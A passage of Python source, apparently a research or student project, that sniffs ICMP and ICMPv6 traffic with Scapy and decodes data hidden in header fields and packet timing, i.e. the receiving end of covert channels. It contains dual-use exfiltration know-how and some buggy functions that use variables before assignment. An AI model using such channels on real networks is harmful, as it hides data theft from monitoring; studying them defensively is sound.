            #TYPE_INFORMATION_REPLY=129
            #TYPE_PARAMETER_PROBLEM=4  
            def callback(packet): 
                field=None 
                if (layer:=packet.getlayer("IPv6")) is not None:  
                    if (layer:=layer.getlayer("ICMPv6ParamProblem")) is not None: 
                        if (field:=layer.getfieldval("ptr")) is not None and field!=0xffffffff: 
                            data.append(field.to_bytes(4,"big").decode()) 
                        elif field is not None and field==0xffffffff: 
                            THREADING_EVENT.set(event_pktconn)
                            return 
                    if (layer:=layer.getlayer("IPerror6")) is not None: 
                        if (field:=layer.getfieldval("plen")) is not None: 
                            data.append(field.to_bytes(2,"big").decode())
                    layer=(
                        layer.getlayer("ICMPv6EchoRequest") if layer.getlayer("ICMPv6EchoReply") is None 
                        else layer.getlayer("ICMPv6EchoReply")
                    )
                    if layer is not None: 
                        if (field:=layer.getfieldval("id")) is not None: 
                            data.append(field.to_bytes(2,"big").decode()) 
            return callback

    def callback_v6_information_request(event_pktconn, data):
            def callback(packet): 
                if packet.haslayer(IPv6) and (packet.haslayer(ICMPv6EchoReply) or packet.haslayer(ICMPv6EchoRequest)):  
                    icmp_echo_type=(
                        "ICMPv6EchoReply" if packet.haslayer(ICMPv6EchoReply) 
                        else "ICMPv6EchoRequest" if packet.haslayer(ICMPv6EchoRequest) 
                        else None
                    ) 
                    if packet[icmp_echo_type].id==0 and packet[icmp_echo_type].seq==1: 
                        THREADING_EVENT.set(event_pktconn)
                        return
                    icmp_id=packet[icmp_echo_type].id
                    byte1 = (icmp_id >> 8) & 0xFF 
                    byte2 = icmp_id & 0xFF 
                    data.extend([chr(byte1),chr(byte2)]) 
            return callback

    def callback_v4_timing_cc(callback_function, event_pktconn,timer,timing_data=[],previous_time=None, numero_bit=0 ): 
            if numero_bit<=0:
                return None   

            DISTANZA_TEMPI=2 #sec
            dict_tempi={}
            dict_tempi.update( [("TEMPO_"+str(index), 3+index*2*DISTANZA_TEMPI)  for index in range(2**numero_bit)])
            dict_bit={ }
            dict_bit.update([ ("TEMPO_"+str(index), index)  for index in range(2**numero_bit) ])  

            MINUTE_TIME=0*60+30 #minuti
            MAX_TIME=max([value for _,value in dict_tempi.items()])+5 
        
            def callback(packet):
                nonlocal previous_time, timer,timing_data, event_pktconn, callback_function
                nonlocal MAX_TIME, MINUTE_TIME  
                if previous_time is None: 
                    previous_time=packet.time 
                    timer.cancel()
                    timer=GET.timer(MAX_TIME,callback_function) 
                    timer.start() 
                    return  
                if packet.time is not None: 
                    delta_time=packet.time-previous_time   
                    arr=arr=[(key, abs(delta_time-value)) for key,value in dict_tempi.items()] 
                    min_value=min([y for _,y in arr]) 
                    min_indices = [i for i, v in enumerate(arr) if v[1] == min_value] 
                    timing_data.append(dict_bit.get(arr[min_indices[0]][0]))
                    previous_time=packet.time
                    timer.cancel() 
                    if len(timing_data)%8==0: 
                        timer=GET.timer(MINUTE_TIME,callback_function) 
                    else:
                        timer=GET.timer(MAX_TIME,callback_function) 
                    timer.start()
            return callback

    def callback_v4_destination_unreachable(event_pktconn,data ):
            TYPE_DESTINATION_UNREACHABLE=3 
            def callback(packet): 
                print(packet.summary)
                if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw):  
                    inner_ip = IP(packet[Raw].load) 
                    if inner_ip[ICMP].id==0 and inner_ip[ICMP].seq==1: 
                        THREADING_EVENT.set(event_pktconn)
                        return 
                    data.append(packet[ICMP].unused.decode())  
                    data.append(inner_ip.len.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00'))  
                    data.append(inner_ip[ICMP].id.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00'))  
            return callback

    def callback_v4_time_exceeded(event_pktconn,data ):
            TYPE_TIME_EXCEEDED=11  
            def callback(packet): 
                if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw):  
                    inner_ip = IP(packet[Raw].load) 
                    if inner_ip[ICMP].id==0 and inner_ip[ICMP].seq==1: 
                        THREADING_EVENT.set(event_pktconn)
                        return 
                    data.append(packet[ICMP].unused.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00'))  
                    data.append(inner_ip.len.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00'))  
                    data.append(inner_ip[ICMP].id.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00')) 
            return callback

    def callback_ipv4_information_request(event_pktconn,data ):
            def callback(packet): 
                if packet.haslayer(IP) and packet.haslayer(ICMP):   
                    if packet[ICMP].id==0 and packet[ICMP].seq==1: 
                        THREADING_EVENT.set(event_pktconn)
                        return
                    icmp_id=packet[ICMP].id
                    byte1 = (icmp_id >> 8) & 0xFF 
                    byte2 = icmp_id & 0xFF  
                    data.extend([chr(byte1),chr(byte2)]) 
                    print(f"Callback received: {byte1} / {byte2}")
            return callback

    def callback_v4_timestamp_request(event_pktconn,data ):
            def callback(packet): 
                if packet.haslayer(IP) and packet.haslayer(ICMP):  
                    if packet[ICMP].id==0 and packet[ICMP].seq==1: 
                        THREADING_EVENT.set(event_pktconn)
                        return
                    icmp_id=packet[ICMP].id
                    byte1 = (icmp_id >> 8) & 0xFF 
                    byte2 = icmp_id & 0xFF  
                    data.extend([chr(byte1),chr(byte2)]) 
                
                    icmp_ts_ori=str(packet[ICMP].ts_ori)[-3:]  
                    icmp_ts_rx=str(packet[ICMP].ts_rx)[-3:]  
                    icmp_ts_tx=str(packet[ICMP].ts_tx)[-3:] 

                    data.extend([chr(int(icmp_ts_ori)),chr(int(icmp_ts_rx)), chr(int(icmp_ts_tx))]) 
            return callback

    def callback_v4_redirect_message(event_pktconn,data ):
            TYPE_REDIRECT=5
            def callback(packet): 
                if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw) : 
                    inner_ip = IP(packet[Raw].load) 
                    if inner_ip[ICMP].id==0 and inner_ip[ICMP].seq==1: 
                        THREADING_EVENT.set(event_pktconn)
                        return  
                    elif not inner_ip: 
                        print("Pacchetto non ha livello IP error\t",packet.summary()) 
                    icmp_ip_length=inner_ip.len
                    icmp_icmp_id=inner_ip[ICMP].id 
                    data.append(icmp_ip_length.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00')) 
                    data.append(icmp_icmp_id.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00'))  
                        
            return callback

    def callback_v4_source_quench(event_pktconn,data ):
            TYPE_SOURCE_QUENCH=4  
            def callback(packet):  
                if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw):  
                    inner_ip = IP(packet[Raw].load)
                    if inner_ip[ICMP].id==0 and inner_ip[ICMP].seq==1: 
                        THREADING_EVENT.set(event_pktconn)
                        return 
                    data.append(packet[ICMP].unused.to_bytes(4,"big").decode().lstrip('\x00').rstrip('\x00'))  
                    data.append(inner_ip.len.to_bytes(2,"big").decode())  
                    data.append(inner_ip[ICMP].id .to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00'))  
            return callback

    def calback_v4_parameter_problem(event_pktconn, data:list ):
            TYPE_PARAMETER_PROBLEM=12 
            def callback(packet):  
                nonlocal event_pktconn, data
                if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw): 
                    #print(f"Callbak 'v4_parameter_problem' arrived packet: {packet.summary()}")
                    inner_ip = IP(packet[Raw].load)
                    if inner_ip[ICMP].id==0 and inner_ip[ICMP].seq==1: 
                        THREADING_EVENT.set(event_pktconn)
                        return 
                    data.append(packet[ICMP].ptr.to_bytes(1,"big").decode().lstrip('\x00').rstrip('\x00'))
                    data.append(packet[ICMP].unused.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00'))  
                    data.append(inner_ip.len.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00'))  
                    data.append(inner_ip[ICMP].id.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00'))  
            return callback

class ReceiveSingleton():  
    def ipv4_information_request(ip_dst:ipaddress.IPv4Address, final_data:list=[], ip_src:ipaddress.IPv4Address=None): 
        if not IS_TYPE.ipaddress(ip_dst) or not IS_TYPE.list(final_data): 
            raise Exception(f"ipv4_information_request: Argomenti non corretti") 
        information_data=[]
        TYPE_INFORMATION_REQUEST=15 
        TYPE_INFORMATION_REPLY=16 
        try: 
            event_pktconn=GET.threading_Event()
            interface= IP_INTERFACE.default_iface() 
            filter=f"icmp and (icmp[0]=={TYPE_INFORMATION_REQUEST} or icmp[0]=={TYPE_INFORMATION_REPLY}) and dst {ip_dst.compressed}"
            if ip_src and IS_TYPE.ipaddress(ip_src): 
                filter+=f" and src {ip_src.compressed}"
            else: print("No need to listen for the source")
        except Exception as e:
            raise Exception(f"ipv4_information_request Eccezione: {e}") 
        try: 
            args={
                "filter": filter
                #,"count":1 
                ,"prn": CALLBACK.callback_ipv4_information_request(event_pktconn,information_data)
                #,"store":True 
                ,"iface":interface
            }
            sniffer,pkt_timer=SNIFFER.sniff_packet(
                args
                ,None 
                ,lambda: SNIFFER.template_timeout(event_pktconn)
            ) 
        except Exception as e:
            raise Exception(f"ipv4_information_request Eccezione: {e}")
        try: 
            THREADING_EVENT.wait(event_pktconn) 
            SNIFFER.stop(sniffer)
            if TIMER.stop(pkt_timer): 
                joined="".join(information_data)
                cleaned="".join(x for x in joined if x in string.printable)
                final_data.append(cleaned) 
                print(f"Done waiting 'parameter_problem' received: {final_data}") 
                return True 
            return False  
        except Exception as e:
            raise Exception(f"ipv4_information_request Eccezione: {e}")
        
    def ipv4_timestamp_request(ip_host:ipaddress.IPv4Address, final_data:list=[], ip_src:ipaddress.IPv4Address=None):
        if not (IS_TYPE.ipaddress(ip_host) and IS_TYPE.list(final_data)): 
            raise Exception(f"ipv4_timestamp_request: Argomenti non corretti")  
        timestamp_data=[] 
        TYPE_TIMESTAMP_REQUEST=13
        TYPE_TIMESTAMP_REPLY=14 
        try: 
            event_pktconn=GET.threading_Event()
            interface= IP_INTERFACE.default_iface() 
            filter=f"icmp and (icmp[0]=={TYPE_TIMESTAMP_REQUEST} or icmp[0]=={TYPE_TIMESTAMP_REPLY}) and dst {ip_host.compressed}" 
            if ip_src and IS_TYPE.ipaddress(ip_src):
                filter+=f" and src {ip_src.compressed}"
            else: print("No need to listen for the source")
        except Exception as e:
            raise Exception(f"Exception: {e}")
        args={
                "filter": filter
                #,"count":1 
                ,"prn": CALLBACK.callback_v4_timestamp_request(event_pktconn,timestamp_data)
                #,"store":True 
                ,"iface":interface
            }
        try: 
            sniffer,pkt_timer=SNIFFER.sniff_packet(
                args
                ,None
                ,lambda: SNIFFER.template_timeout(event_pktconn)
            ) 
        except Exception as e:
            raise Exception(f"wait_conn_from_attacker: {e}")
        THREADING_EVENT.wait(event_pktconn) 
        SNIFFER.stop(sniffer)
        if TIMER.stop(pkt_timer): 
            joined="".join(timestamp_data)
            cleaned="".join(x for x in joined if x in string.printable)
            final_data.append(cleaned) 
            print(f"Done waiting 'parameter_problem' received: {final_data}") 
            return True 
        return False  
    
    def ipv4_redirect(ip_host:ipaddress.IPv4Address, final_data:list=[], ip_src:ipaddress.IPv4Address=None): 
        if not (IS_TYPE.ipaddress(ip_host) and IS_TYPE.list(final_data)): 
            raise Exception(f"ipv4_redirect: Argomenti non corretti") 
        redirect_data=[] 
        TYPE_REDIRECT=5 
        try: 
            event_pktconn=GET.threading_Event()
            interface= IP_INTERFACE.default_iface() 
            filter= f"icmp and (icmp[0]=={TYPE_REDIRECT}) and dst {ip_host.compressed}" 
            if ip_src and IS_TYPE.ipaddress(ip_src):
                filter+=f" and src {ip_src.compressed}"
            else: print("No need to listen for the source")
        except Exception as e:
            raise Exception(f"Exception: {e}")
        args={
                "filter": filter
                #,"count":1 
                ,"prn": CALLBACK.callback_v4_redirect_message(event_pktconn,redirect_data)
                #,"store":True 
                ,"iface":interface
        } 
        try: 
            sniffer,pkt_timer=SNIFFER.sniff_packet(
                args
                ,None
                ,lambda: SNIFFER.template_timeout(event_pktconn)
            ) 
            THREADING_EVENT.wait(event_pktconn) 
        except Exception as e:
            raise Exception(f"wait_conn_from_attacker: {e}")
        SNIFFER.stop(sniffer)
        if TIMER.stop(pkt_timer): 
            joined="".join(redirect_data)
            cleaned="".join(x for x in joined if x in string.printable)
            final_data.append(cleaned) 
            print(f"Done waiting 'parameter_problem' received: {final_data}") 
            return True 
        return False  

    def ipv4_source_quench(ip_host:ipaddress.IPv4Address, final_data:list=[], ip_src:ipaddress.IPv4Address=None): 
        if not (IS_TYPE.ipaddress(ip_host) and IS_TYPE.list(final_data)): 
            raise Exception(f"Argoemnti non corretti") 
        source_quench_data=[] 
        TYPE_SOURCE_QUENCH=4   
        try: 
            event_pktconn=GET.threading_Event()
            interface= IP_INTERFACE.default_iface() 
            filter=f"icmp and (icmp[0]=={TYPE_SOURCE_QUENCH}) and dst {ip_host.compressed}" 
            if ip_src and IS_TYPE.ipaddress(ip_src): 
                filter+=f" and src {ip_src.compressed}" 
            else: print("No need to listen for the source")
        except Exception as e:
            raise Exception(f"Exception: {e}")
        args={
                "filter":f"icmp and (icmp[0]=={TYPE_SOURCE_QUENCH}) and dst {ip_host.compressed}" 
                #,"count":1 
                ,"prn": CALLBACK.callback_v4_source_quench(event_pktconn,source_quench_data)
                #,"store":True 
                ,"iface":interface
        } 
        try: 
            sniffer,pkt_timer=SNIFFER.sniff_packet(
                args
                ,None
                ,lambda: SNIFFER.template_timeout(event_pktconn)
            ) 
            THREADING_EVENT.wait(event_pktconn) 
        except Exception as e:
            raise Exception(f"wait_conn_from_attacker: {e}")
        SNIFFER.stop(sniffer)
        if TIMER.stop(pkt_timer): 
            joined="".join(source_quench_data)
            cleaned="".join(x for x in joined if x in string.printable)
            final_data.append(cleaned) 
            print(f"Done waiting 'parameter_problem' received: {final_data}") 
            return True 
        return False  

    def ipv4_parameter_problem(ip_host:ipaddress.IPv4Address, final_data:list=[], ip_src:ipaddress.IPv4Address=None):  
        if not (IS_TYPE.ipaddress(ip_host) and IS_TYPE.list(final_data)): 
            raise Exception(f"Argomenti non corretti")  
        parameter_problem_data=[]
        TYPE_PARAMETER_PROBLEM=12 
        try: 
            event_pktconn=GET.threading_Event()
            interface= IP_INTERFACE.default_iface() 
            filter= f"icmp and (icmp[0]=={TYPE_PARAMETER_PROBLEM}) and dst {ip_host.compressed}" 
            if ip_src and IS_TYPE.ipaddress(ip_src): 
                filter+=f" and src {ip_src.compressed}" 
            else: print("No need to listen for the source")
        except Exception as e:
            raise Exception(f"Exception: {e}") 
        #print("interface: ",interface) 
        args={
                "filter": filter
                #,"count":1 
                ,"prn": CALLBACK.callback_v4_parameter_problem(event_pktconn, parameter_problem_data) 
                #,"store":True 
                ,"iface":interface
        } 
        try: 
            sniffer,pkt_timer=SNIFFER.sniff_packet(
                args
                ,None
                ,lambda: SNIFFER.template_timeout(event_pktconn)
            )   
            THREADING_EVENT.wait(event_pktconn) 
        except Exception as e:
            raise Exception(f"wait_conn_from_attacker: {e}")
        SNIFFER.stop(sniffer)
        if TIMER.stop(pkt_timer):   
            print(f"I DATI SONO CORRETTI: {parameter_problem_data}")
            joined="".join(parameter_problem_data)
            cleaned="".join(x for x in joined if x in string.printable)
            final_data.append(cleaned) 
            print(f"Done waiting 'parameter_problem' received: {final_data}") 
            return True 
        return False  

    def ipv4_time_exceeded(ip_host:ipaddress.IPv4Address, final_data:list=[], ip_src:ipaddress.IPv4Address=None): 
        if not (IS_TYPE.ipaddress(ip_host) and IS_TYPE.list(final_data)): 
            raise Exception(f"Argoemnti non corretti") 
        time_exceeded_data=[]
        TYPE_TIME_EXCEEDED=11 
        try: 
            event_pktconn=GET.threading_Event()
            interface= IP_INTERFACE.default_iface() 
            filter= f"icmp and (icmp[0]=={TYPE_TIME_EXCEEDED}) and dst {ip_host.compressed}" 
            if IS_TYPE.ipaddress(ip_src): 
                filter+=f" and src {ip_src.compressed}"
            else: print("No need to listen for the source")
        except Exception as e:
            raise Exception(f"Exception: {e}")
        args={
                "filter": filter
                #,"count":1 
                ,"prn":  CALLBACK.callback_v4_time_exceeded(event_pktconn,time_exceeded_data)
                #,"store":True 
                ,"iface":interface
        } 
        try:
            event_pktconn=GET.threading_Event()
            sniffer,pkt_timer=SNIFFER.sniff_packet(
                args
                ,None
                ,lambda: SNIFFER.template_timeout(event_pktconn)
            ) 
            THREADING_EVENT.wait(event_pktconn) 
        except Exception as e:
            raise Exception(f"wait_conn_from_attacker: {e}")
        SNIFFER.stop(sniffer)
        if TIMER.stop(pkt_timer): 
            joined="".join(time_exceeded_data)
            cleaned="".join(x for x in joined if x in string.printable)
            final_data.append(cleaned) 
            print(f"Done waiting 'parameter_problem' received: {final_data}") 
            return True 
        return False  

    def ipv4_destination_unreachable(ip_host:ipaddress.IPv4Address, final_data:list=[], ip_src:ipaddress.IPv4Address=None): 
        print("HHHHH", ip_host)
        if not (IS_TYPE.ipaddress(ip_host) and IS_TYPE.list(final_data)): 
            raise Exception(f"Argomenti non corretti") 
        destination_unreachable_data=[]
        TYPE_DESTINATION_UNREACHABLE=3  
        try: 
            event_pktconn=GET.threading_Event()
            interface= IP_INTERFACE.default_iface() 
            filter= f"icmp and (icmp[0]=={TYPE_DESTINATION_UNREACHABLE}) and dst {ip_host.compressed}"
            if ip_src and IS_TYPE.ipaddress(ip_src): 
                filter+=f" and src {ip_src.compressed}"
            else: print("No need to listen for the source")
        except Exception as e:
            raise Exception(f"Exception: {e}")
        args={
                "filter": filter  
                #,"count":1 
                ,"prn": CALLBACK.callback_v4_destination_unreachable(event_pktconn,destination_unreachable_data)
                #,"store":True 
                ,"iface":interface
        } 
        try:
            event_pktconn=GET.threading_Event()
            sniffer,pkt_timer=SNIFFER.sniff_packet(
                args
                ,None
                ,lambda: SNIFFER.template_timeout(event_pktconn)
            ) 
        except Exception as e:
            raise Exception(f"wait_conn_from_attacker: {e}")
        THREADING_EVENT.wait(event_pktconn) 
        print("AAAAIIIII")
        SNIFFER.stop(sniffer)
        if TIMER.stop(pkt_timer):  
            joined="".join(destination_unreachable_data)
            cleaned="".join(x for x in joined if x in string.printable)
            final_data.append(cleaned) 
            print(f"Done waiting 'parameter_problem' received: {final_data}") 
            return True 
        return False  
    
    def ipv4_timing_cc(ip_host:ipaddress.IPv4Address, numero_bit=0, final_data:list=[], ip_src:ipaddress.IPv4Address=None): 
        if not (IS_TYPE.ipaddress(ip_host) and IS_TYPE.list(final_data)): 
            raise Exception(f"ipv4_timing_cc: Argoemnti non corretti")
        if numero_bit<=0:
            raise Exception("ipv4_timing_cc: Numero di bit passato non valido") 
        interface= IP_INTERFACE.default_iface()   
        timing_data=[]
        TYPE_ECHO_REQUEST=8
        TYPE_ECHO_REPLY=0 
        last_packet_time=None  
        try: 
            event_pktconn=GET.threading_Event()
            callback_function=lambda: timeout_timing_covertchannel(event_pktconn)
            timer_timing_CC=GET.timer(None,callback_function) 
            filter=f"icmp and (icmp[0]=={TYPE_ECHO_REQUEST} or icmp[0]=={TYPE_ECHO_REPLY}) and dst {ip_host.compressed}"
            if IS_TYPE.ipaddress(ip_src): 
                filter+=f" and src {ip_src.compressed}" 
            else: print("No need to listen for the source")
        except Exception as e:
            raise Exception(f"Exception: {e}") 
        args={
                "filter": filter
                #,"count":1 
                ,"prn":  CALLBACK.callback_v4_timing_cc(
                    callback_function
                    ,event_pktconn
                    ,timer_timing_CC
                    ,timing_data
                    ,last_packet_time
                    ,numero_bit
                )
                #,"store":True 
                ,"iface":interface
        }  
        try: 
            sniffer,pkt_timer=SNIFFER.sniff_packet(
                args
                ,None
                ,lambda: SNIFFER.template_timeout(event_pktconn)
            )  
            THREADING_EVENT.wait(event_pktconn) 
            str_data=""
            for integer in timing_data:
                str_data+=format(integer, f'0{numero_bit}b') 
            raw_data="" 
            for index in range(0, len(str_data), 8):
                int_data=0
                for bit in str_data[index:index+8][::-1]:
                    int_data=int_data<<1|int(bit)
                raw_data+=chr(int_data) 
        except Exception as e:
            raise Exception(f"wait_conn_from_attacker: {e}")
        SNIFFER.stop(sniffer)
        if TIMER.stop(pkt_timer):  
            joined="".join(raw_data)
            cleaned="".join(x for x in joined if x in string.printable)
            final_data.append(cleaned) 
            print(f"Done waiting 'parameter_problem' received: {final_data}") 
            return True 
        return False

    def ipv4_timing_channel_8bit(ip_dst:ipaddress=None, min_delay:int=1, max_delay:int=30, stop_value: int = 255): 
        if not (IS_TYPE.ipaddress(ip_dst) and IS_TYPE.integer(min_delay) and IS_TYPE.integer(max_delay) and IS_TYPE.integer(stop_value)):
            raise Exception("test_timing_channel8bit: Argomenti non validi") 
        if min_delay<=0: 
            raise Exception("Valori negativi o nulli non sono accettati")
        if max_delay<=min_delay: 
            raise Exception("Il vlaore masismo non può essere minore di quello minimo") 
        if not (0<=stop_value <=255): 
            raise Exception("Valore stop value non corretto")
        start_time=end_time=previous_time=None 
        stop_flag={"value":False} 
        received_data=[] 

        def decode_byte(delay): 
            #(byte/255)=(delay-min_delay)/(max_delay-min_delay) 
            frazione = (delay - min_delay) / (max_delay - min_delay) 
            byte=int(round(frazione*255)) 
            return byte 
        
        def callback_timing_channel8bit(pkt): 
            nonlocal previous_time, start_time, end_time 
            if pkt.haslayer("ICMP") and (pkt[ICMP].type==8 or pkt[ICMP].type==0): 
                #current_time=datetime.datetime.now() 
                #current_time=time.perf_counter() 
                current_time=pkt.time 
                if previous_time is not None: 
                    delta=(current_time-previous_time) 
                    byte=decode_byte(delta) 
                    print(f"Delta:{delta}\tByte:{byte} Char:{chr(byte)}") 
                    received_data.append(chr(byte)) 
                    if byte==stop_value: 
                        stop_flag["value"]=True 
                        end_time=pkt.time 
                else: start_time=pkt.time 
                previous_time=current_time 
        
        def stop_filter(pkt): 
            return stop_flag["value"] 
        
        print("In ascolto dei pacchetti ICMP...")
        sniff(
            filter=f"icmp and dst host {ip_dst.compressed}" 
            ,prn=callback_timing_channel8bit 
            ,store=False 
            ,stop_filter=stop_filter 
        )  
        received_data="".join(x for x in received_data) 
        print(f"Dati ricevuti: {received_data}") 
        print(f"Tempo di esecuzione: {end_time-start_time}") 



    #--------------------- 
    def ipv6_information_request(ip_host:ipaddress.IPv6Address, final_data:list=[], ip_src:ipaddress.IPv6Address=None):
        information_data=[] 
        if not IS_TYPE.ipaddress(ip_host) or not IS_TYPE.list(final_data): 
            raise Exception(f"Argoemnti non corretti") 
        TYPE_INFORMATION_REQUEST=128
        TYPE_INFORMATION_REPLY=129  
        #ip_google=socket.getaddrinfo("www.google.com", None, socket.AF_UNSPEC)
        #print("IP_GOOGLE: ",ip_google)
        try: 
            event_pktconn=GET.threading_Event()
            interface= IP_INTERFACE.default_iface() 
            filter= f"icmp6 and (icmp6[0]=={TYPE_INFORMATION_REQUEST} or icmp6[0]=={TYPE_INFORMATION_REPLY}) and dst {ip_host.compressed}"
            if IS_TYPE.ipaddress(ip_src): 
                filter+=f" and src {ip_src.compressed}" 
        except Exception as e:
            raise Exception(f"Exception: {e}")
        args={
                "filter": filter
                #,"count":1 
                ,"prn":  CALLBACK.callback_v6_information_request(event_pktconn,information_data)
                #,"store":True 
                ,"iface": interface
            }
        try: 
            sniffer,pkt_timer=SNIFFER.sniff_packet(
                args
                ,None
                ,lambda: SNIFFER.template_timeout(event_pktconn)
            ) 
            THREADING_EVENT.wait(event_pktconn) 
        except Exception as e:
            raise Exception(f"get_information_request: {e}")
        SNIFFER.stop(sniffer)
        if TIMER.stop(pkt_timer): 
            joined="".join(information_data)
            cleaned="".join(x for x in joined if x in string.printable)
            final_data.append(cleaned) 
            print(f"Done waiting 'parameter_problem' received: {final_data}") 
            return True 
        return False  

    def ipv6_parameter_problem(ip_host:ipaddress.IPv6Address, final_data:list=[], ip_src:ipaddress.IPv6Address=None): 
        parameter_problem_data=[] 
        if not IS_TYPE.ipaddress(ip_host) or not IS_TYPE.list(final_data): 
            raise Exception(f"Argoemnti non corretti") 
        TYPE_PARAMETER_PROBLEM=4   
        try: 
            event_pktconn=GET.threading_Event()
            interface= IP_INTERFACE.default_iface() 
            filter= f"icmp6 and (icmp6[0]=={TYPE_PARAMETER_PROBLEM}) and dst {ip_host.compressed}" 
            if IS_TYPE.ipaddress(ip_src): 
                filter+=f" and src {ip_src.compressed}" 
        except Exception as e:
            raise Exception(f"Exception: {e}")
        args={
                "filter": filter
                #,"count":1 
                ,"prn":  CALLBACK.callback_v6_parameter_problem(event_pktconn,parameter_problem_data)
                #,"store":True 
                ,"iface":interface
        } 
        try: 
            sniffer,pkt_timer=SNIFFER.sniff_packet(
                args
                ,None
                ,lambda: SNIFFER.template_timeout(event_pktconn)
            ) 
            THREADING_EVENT.wait(event_pktconn) 
        except Exception as e:
            raise Exception(f"get_parameter_problem: {e}")
        SNIFFER.stop(sniffer)
        if TIMER.stop(pkt_timer): 
            joined="".join(parameter_problem_data)
            cleaned="".join(x for x in joined if x in string.printable)
            final_data.append(cleaned) 
            print(f"Done waiting 'parameter_problem' received: {final_data}") 
            return True 
        return False  

    def ipv6_time_exceeded(ip_host:ipaddress.IPv6Address, final_data:list=[], ip_src:ipaddress.IPv6Address=None): 
        time_exceeded_data=[]
        if not IS_TYPE.ipaddress(ip_host) or not IS_TYPE.list(final_data): 
            raise Exception(f"Argoemnti non corretti") 
        TYPE_TIME_EXCEEDED=3 
        try: 
            event_pktconn=GET.threading_Event()
            interface= IP_INTERFACE.default_iface() 
            filter=f"icmp6 and (icmp6[0]=={TYPE_TIME_EXCEEDED}) and dst {ip_host.compressed}" 
            if IS_TYPE.ipaddress(ip_src): 
                filter+=f" and src {ip_src.compressed}"
        except Exception as e:
            raise Exception(f"Exception: {e}")
        args={
                "filter": filter
                #,"count":1 
                ,"prn":  CALLBACK.callback_v6_time_exceeded(event_pktconn,time_exceeded_data)
                #,"store":True 
                ,"iface":interface
        } 
        try: 
            sniffer,pkt_timer=SNIFFER.sniff_packet(
                args
                ,None
                ,lambda: SNIFFER.template_timeout(event_pktconn)
            ) 
            THREADING_EVENT.wait(event_pktconn) 
        except Exception as e:
            raise Exception(f"wait_conn_from_attacker: {e}")
        SNIFFER.stop(sniffer)
        if TIMER.stop(pkt_timer): 
            joined="".join(time_exceeded_data)
            cleaned="".join(x for x in joined if x in string.printable)
            final_data.append(cleaned) 
            print(f"Done waiting 'parameter_problem' received: {final_data}") 
            return True 
        return False  

    def ipv6_packet_to_big(ip_host:ipaddress.IPv6Address, final_data:list=[], ip_src:ipaddress.IPv6Address=None): 
        if not IS_TYPE.ipaddress(ip_host) or not IS_TYPE.list(timestamp_data): 
            raise Exception(f"Argoemnti non corretti") 
        try: 
            timestamp_data:list=[]
            TYPE_PKT_BIG= 2 
            interface= IP_INTERFACE.default_iface() 
            event_pktconn=GET.threading_Event()
            filter=f"icmp6 and (icmp6[0]=={TYPE_PKT_BIG}) and dst {ip_host.compressed}" 
            if IS_TYPE.ipaddress(ip_src): 
                filter+=f" and src {ip_src.compressed}"
        except Exception as e: 
            raise Exception(f"Exception: {e}")
        try:
            args={
                "filter": filter
                #,"count":1 
                ,"prn": CALLBACK.callback_v6_packet_to_big(event_pktconn,timestamp_data)
                #,"store":True 
                ,"iface": interface
            }
            sniffer,pkt_timer=SNIFFER.sniff_packet(
                args
                ,None
                ,lambda: SNIFFER.template_timeout(event_pktconn)
            ) 
        except Exception as e:
            raise Exception(f"wait_conn_from_attacker: {e}") 
        THREADING_EVENT.wait(event_pktconn)
        SNIFFER.stop(sniffer)
        if TIMER.stop(pkt_timer): 
            joined="".join(timestamp_data)
            cleaned="".join(x for x in joined if x in string.printable)
            final_data.append(cleaned) 
            print(f"Done waiting 'parameter_problem' received: {final_data}") 
            return True 
        return False  

    def ipv6_destination_unreachable(ip_host:ipaddress.IPv6Address, final_data:list=[], ip_src:ipaddress.IPv6Address=None): 
        if not IS_TYPE.ipaddress(ip_host) or not IS_TYPE.list(destination_unreachable_data): 
            raise Exception(f"Argoemnti non corretti") 
        destination_unreachable_data:list=[]
        TYPE_DESTINATION_UNREACHABLE=1 
        try: 
            event_pktconn=GET.threading_Event()
            interface= IP_INTERFACE.default_iface() 
            filter=f"icmp6 and (icmp6[0]=={TYPE_DESTINATION_UNREACHABLE}) and dst {ip_host.compressed}" 
            if IS_TYPE.ipaddress(ip_src): 
                filter+=f" and src {ip_src.compressed}"
        except Exception as e:
            raise Exception(f"Exception: {e}")
        try:
            args={
                "filter": filter
                #,"count":1 
                ,"prn": CALLBACK.callback_v6_destination_unreachable(event_pktconn,destination_unreachable_data)
                #,"store":True 
                ,"iface":interface
            } 
            sniffer,pkt_timer=SNIFFER.sniff_packet(
                args
                ,None
                ,lambda: SNIFFER.template_timeout(event_pktconn)
            )  
        except Exception as e:
            raise Exception(f"wait_conn_from_attacker: {e}") 
        THREADING_EVENT.wait(event_pktconn) 
        SNIFFER.stop(sniffer)
        if TIMER.stop(pkt_timer): 
            joined="".join(destination_unreachable_data)
            cleaned="".join(x for x in joined if x in string.printable)
            final_data.append(cleaned) 
            print(f"Done waiting 'parameter_problem' received: {final_data}") 
            return True 
        return False  

    def ipv6_timing_cc(ip_dst:ipaddress.IPv6Address, numero_bit:int=0, final_data:list=[], ip_src:ipaddress.IPv6Address=None):  
        if not IS_TYPE.ipaddress(ip_dst) or not IS_TYPE.list(timing_data): 
            raise Exception(f"Argoemnti non corretti")
        try:  
            interface= IP_INTERFACE.default_iface() 
            if numero_bit<=0:
                raise Exception("Numero di bit passato non valido")
        except Exception as e:
            raise Exception(f"Exception: {e}") 
        timing_data:list=[]
        TYPE_INFORMATION_REQUEST=128
        TYPE_INFORMATION_REPLY=129
        last_packet_time=None
        try: 
            event_pktconn=GET.threading_Event()
            callback_function=lambda: timeout_timing_covertchannel(event_pktconn)
            timer_timing_CC=GET.timer(None,callback_function) 
